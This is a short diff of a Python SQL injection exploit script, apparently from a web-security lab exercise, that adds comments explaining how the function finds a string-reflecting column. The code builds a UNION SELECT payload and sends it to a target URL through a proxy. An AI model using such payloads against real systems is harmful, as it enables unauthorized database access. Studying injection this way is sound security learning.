@@ -34,11 +34,14 @@ def exploit_sqli_string_field(url, num_col):
     *payload_list[i-1] refers to the specific element in the list (payload_list) at the calculated index.
 
     *string is the sample string payload, which is assigned to the element at the calculated index.'''
-    
+
         sql_payload = "' union select " + ','.join(payload_list) + "--"
         r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
         res = r.text
         if string.strip('\'') in res:
+            '''.strip('\'') is used to remove single quotes (') from both ends of the string.
+             This is done to handle cases where the server might return the string with or without single quotes. 
+             The strip() method removes leading and trailing characters from the string.'''
             return i
     return False
 
